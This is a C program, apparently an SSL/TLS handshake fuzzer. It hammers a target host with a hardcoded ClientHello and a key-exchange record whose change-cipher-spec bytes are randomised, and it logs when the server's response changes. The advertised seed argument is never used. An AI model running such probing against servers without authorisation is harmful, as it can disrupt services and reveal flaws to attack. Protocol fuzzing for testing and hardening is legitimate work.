#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

char buf[1024];

#define TIMEOUT 5 

const char hello[] =
"\x80\x4C\x01\x03\x00\x00\x33\x00\x00\x00\x10\x00\x00\x04\x00\x00"
"\x05\x00\x00\x0A\x01\x00\x80\x07\x00\xC0\x03\x00\x80\x00\x00\x09"
"\x06\x00\x40\x00\x00\x64\x00\x00\x62\x00\x00\x03\x00\x00\x06\x02"
"\x00\x80\x04\x00\x80\x00\x00\x13\x00\x00\x12\x00\x00\x63\xC0\xB2"
"\x15\x60\x31\xCE\xA4\xF9\xA6\xBD\x8B\x2F\x29\xBA\xD0\x8D";

//char ke_cs_exchange[] =
//"\x16\x03\x00\x00\x84\x10\x00\x00\x80\x3E\x72\x9F\x0E\x49\x03\xE3"
//"\xC7\x15\x7F\xC9\x1D\x86\x7E\x10\x1A\x53\x1D\xAE\x27\x16\x35\x2D"
//"\x8D\x7A\xCA\xAF\x22\x25\x28\x86\x7E\x04\x5A\x45\xFA\xAB\xCD\xCB"
//"\xE7\x96\xCD\xB8\xF9\xC0\xC9\x7D\x4E\xC2\xAA\x5E\x38\xCE\xC5\x12"
//"\x83\x40\x37\xCE\x49\x0E\x5B\x59\xD0\xD6\xDB\x65\x02\xB1\xAD\x61"
//"\x4F\x27\x57\xBC\x76\x09\xC5\xE8\xD7\xB6\x68\x0A\xD5\xA3\x77\x61"
//"\xE7\x62\xCC\xD8\x8C\xF0\xD5\xFA\x86\x6E\xD7\xC9\xAA\xED\x8B\xDA"
//"\x56\xD6\x9E\x76\xB6\x2B\xE8\x24\xFE\xBE\x6C\x4F\x5E\x5B\x33\xA5"
//"\xC3\x71\x34\x5E\xCC\x13\xD5\x86\xD0"
//"\x14\x03\x00\x00\x01\x01"                                         //heres the change cipherspec [137] - [142]
//"\x16"
//"\x03\x00\x00\x38\x97\x84\x2C\x1F\x58\x9E\xF8\xEF\xCC\x1A\xB5\xA5"
//"\x92\x3B\x10\x6E\x04\xE6\xCB\xC4\xE8\x20\xC6\x65\xC9\x59\x40\xE3"
//"\x5F\x82\x60\xE2\x93\x86\x27\x5A\x44\x1E\x5F\x94\x2B\x3F\x41\x26"
//"\xC1\x09\x47\x4D\x19\xA1\x63\x49\x23\x76\xBF\x83";

char ke_cs_exchange[] =
"\x16\x03\x00\x00\x84\x10\x00\x00\x80\x3E\x72\x9F\x0E\x49\x03\xE3"
"\xC7\x15\x7F\xC9\x1D\x86\x7E\x10\x1A\x53\x1D\xAE\x27\x16\x35\x2D"
"\x8D\x7A\xCA\xAF\x22\x25\x28\x86\x7E\x04\x5A\x45\xFA\xAB\xCD\xCB"
"\xE7\x96\xCD\xB8\xF9\xC0\xC9\x7D\x4E\xC2\xAA\x5E\x38\xCE\xC5\x12"
"\x83\x40\x37\xCE\x49\x0E\x5B\x59\xD0\xD6\xDB\x65\x02\xB1\xAD\x61"
"\x4F\x27\x57\xBC\x76\x09\xC5\xE8\xD7\xB6\x68\x0A\xD5\xA3\x77\x61"
"\xE7\x62\xCC\xD8\x8C\xF0\xD5\xFA\x86\x6E\xD7\xC9\xAA\xED\x8B\xDA"
"\x56\xD6\x9E\x76\xB6\x2B\xE8\x24\xFE\xBE\x6C\x4F\x5E\x5B\x33\xA5"
"\xC3\x71\x34\x5E\xCC\x13\xD5\x86\xD0\x0F\x03\x00\x3E\x45\x90\x16"
"\x03\x00\x00\x38\x97\x84\x2C\x1F\x58\x9E\xF8\xEF\xCC\x1A\xB5\xA5"
"\x92\x3B\x10\x6E\x04\xE6\xCB\xC4\xE8\x20\xC6\x65\xC9\x59\x40\xE3"
"\x5F\x82\x60\xE2\x93\x86\x27\x5A\x44\x1E\x5F\x94\x2B\x3F\x41\x26"
"\xC1\x09\x47\x4D\x19\xA1\x63\x49\x23\x76\xBF\x83";



int main(int argc, char *argv[]) {
	struct sockaddr_in addr;
	int s, port = 0, first = 1, counter, mu, last;
	// six bytes of change-cipher-spec field
	int a,b,c,d,e,f;
	char *host = NULL;
        unsigned int seed;
	struct timeval tv;



        if (argc < 3) {
                fprintf(stderr, "Use: %s [ip] [port] <seed>\n", argv[0]);
                exit(1);
        }
	

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stderr, "Port out of range (%d)\n", port);
		exit(1);
	}

        memset(&tv, 0, sizeof(tv));
        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;

	memset(&addr, 0, sizeof(addr));


	signal(SIGPIPE, SIG_IGN); /* Ignore SIGPIPE */
	counter = 0;
        while(1) {
	    counter++;
	    if ((counter % 2) == 0) {
	        a = ke_cs_exchange[137] = rand() % 256;
                b = ke_cs_exchange[138] = rand() % 256;
                c = ke_cs_exchange[139] = rand() % 256;
                d = ke_cs_exchange[140] = rand() % 256;
                e = ke_cs_exchange[141] = rand() % 256;
                f = ke_cs_exchange[142] = rand() % 256;
	    } else {
		//"\x14\x03\x00\x00\x01\x01"
		a = ke_cs_exchange[137] = 0x14;
		b = ke_cs_exchange[138] = 0x03;
		c = ke_cs_exchange[139] = 0x00;
		d = ke_cs_exchange[140] = 0x00;
		e = ke_cs_exchange[141] = 0x01;
		f = ke_cs_exchange[142] = 0x01;
	    }

	    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	    }
            setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
	    addr.sin_family = AF_INET;
	    addr.sin_port = htons(port);
	    addr.sin_addr.s_addr = inet_addr(host);
	    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stderr, "Unable to connect: %s\n", strerror(errno));
	        if (counter > 1) {
		    fprintf(stderr, "a is %d\nb is %d\nc is %d\nd is %d\ne is %d\nf is %d\n", a,b,c,d,e,f);
		}
		exit(0);
	    }

	    write(s, hello, sizeof(hello) - 1);
            mu=recv(s,buf,sizeof(buf),0);
	    if (mu) {
		    memset (&buf, 0, sizeof(buf));
		    mu = 0;
		    usleep(2000);
		    write(s, ke_cs_exchange, sizeof(ke_cs_exchange) - 1);
                    mu=recv(s,buf,sizeof(buf),0);
		    fprintf(stderr, "received %d bytes\n", mu);           //remove
                    if ( (mu != last) && (counter > 1) ) {
                        fprintf(stderr, "return buffer from scanned host just changed Counter=%d\n", counter);
                        fprintf(stderr, "expected %d return bytes...received %d bytes\n", last, mu);
			fprintf(stderr, "a is %d\nb is %d\nc is %d\nd is %d\ne is %d\nf is %d\n", a,b,c,d,e,f);
			exit(0);
	            }
		    last = mu;
            } else {
		    if (counter > 1) {
			   fprintf(stderr, "server not sending back any data with counter = %d\n", counter);
			   fprintf(stderr, "a is %d\nb is %d\nc is %d\nd is %d\ne is %d\nf is %d\n", a,b,c,d,e,f);
			   exit(0);
		    }
            }
	    close(s);
        }
	
	exit(1);
}

